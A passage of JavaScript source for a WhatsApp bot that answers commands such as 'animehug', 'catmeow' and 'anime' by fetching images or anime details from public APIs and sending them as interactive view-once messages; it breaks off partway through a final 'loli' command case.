          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekill':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecry':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewlp':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekiss':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehug':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeneko':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepat':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeslap':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecuddle':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewaifu':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animenom':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefoxgirl':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animetickle': {
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animegecg': {
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'dogwoof': {
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case '8ballpool': {
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'goosebird': {
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefeed': {
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeavatar': {
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'lizardpic': {
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'catmeow': {
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'anime': {
if (!text) return replygcyuta(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
replygcyuta(mess.loading)
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcyuta(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${text}*_\n\n${animetxt}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:anime.picture}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                
                }
                break
			case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
